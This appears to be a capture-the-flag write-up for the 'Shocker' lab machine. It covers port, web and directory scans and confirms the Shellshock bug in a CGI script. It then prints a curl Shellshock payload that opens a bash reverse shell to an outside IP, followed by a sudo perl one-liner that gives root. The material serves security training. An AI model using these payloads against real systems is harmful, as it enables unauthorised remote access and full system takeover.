# Shocker

## Information Gathering
10.10.10.56<br>
Shocker<br>

<ul>Software Versions
	<li>Apache httpd 2.4.18</li>
</ul>

## Enumeration
Start with an nmap scan:
```bash
# Nmap 7.92 scan initiated Mon Feb 14 17:59:05 2022 as: nmap -sC -sV -oN nmap/shocker.nmap 10.10.10.56
Nmap scan report for 10.10.10.56
Host is up (0.033s latency).
Not shown: 998 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Site doesnt have a title (text/html).
|_http-server-header: Apache/2.4.18 (Ubuntu)
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Feb 14 17:59:14 2022 -- 1 IP address (1 host up) scanned in 8.54 seconds

```
There is a web server so I run a Nikto and directory busting scan
```bash
- Nikto v2.1.6/2.1.5
+ Target Host: 10.10.10.56
+ Target Port: 80
+ GET The anti-clickjacking X-Frame-Options header is not present.
+ GET The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ GET The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ HEAD Apache/2.4.18 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ GET Server may leak inodes via ETags, header found with file /, inode: 89, size: 559ccac257884, mtime: gzip
+ OPTIONS Allowed HTTP Methods: GET, HEAD, POST, OPTIONS 
+ OSVDB-3233: GET /icons/README: Apache default file found.
```
Directory Busting
```bash
DirBuster 1.0-RC1 - Report
http://www.owasp.org/index.php/Category:OWASP_DirBuster_Project
Report produced on Mon Feb 14 18:15:19 EST 2022
--------------------------------

http://10.10.10.56:80
--------------------------------
Directories found during testing:

Dirs found with a 200 response:

/

Dirs found with a 403 response:

/cgi-bin/
/icons/
/icons/small/


--------------------------------
Files found during testing:

Files found with a 200 responce:

/index.html
/cgi-bin/user.sh
/icons/README.html


--------------------------------

```
Because there is an older version of Apache running and that there is an exposed cgi-bin with shell script (Also the name of the box is shocker). I do a vulnerability scan to see if there is a shellshock vulnerability.
```bash
# Nmap 7.92 scan initiated Mon Feb 14 18:09:26 2022 as: nmap -p80 --script=http-shellshock --script-args uri=/cgi-bin/user.sh -oN nmap/vulnerbility_scan.nmap 10.10.10.56
Nmap scan report for 10.10.10.56
Host is up (0.028s latency).

PORT   STATE SERVICE
80/tcp open  http
| http-shellshock: 
|   VULNERABLE:
|   HTTP Shellshock vulnerability
|     State: VULNERABLE (Exploitable)
|     IDs:  CVE:CVE-2014-6271
|       This web application might be affected by the vulnerability known
|       as Shellshock. It seems the server is executing commands injected
|       via malicious HTTP headers.
|             
|     Disclosure date: 2014-09-24
|     References:
|       http://seclists.org/oss-sec/2014/q3/685
|       http://www.openwall.com/lists/oss-security/2014/09/24/10
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-7169

# Nmap done at Mon Feb 14 18:09:27 2022 -- 1 IP address (1 host up) scanned in 0.62 seconds
``` 
## Exploitation
There are a few ways to exploit shellschock. You can use a Proxy like BurpSuite, but I found the simpliest way is to use cURL. With the payload
```bash
curl -H 'Cookie: () { :;}; /bin/bash -i >& /dev/tcp/10.10.14.122/1337 0>&1' http://10.10.10.56/cgi-bin/user.sh
```
This will be enough to drop you into a user shell.

## Privilege Escalation
The privilege escalation was pretty straightforward for this box. Simply:
```bash
sudo -l

env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User shelly may run the following commands on Shocker:
    (root) NOPASSWD: /usr/bin/perl
```
Checking out <a href="https://gtfobins.github.io/#">GTFObins</a>, searching "perl" and clicking "sudo" gives you a one-liner to escalate
```bash
sudo /usr/bin/perl -e 'exec "/bin/sh";'
```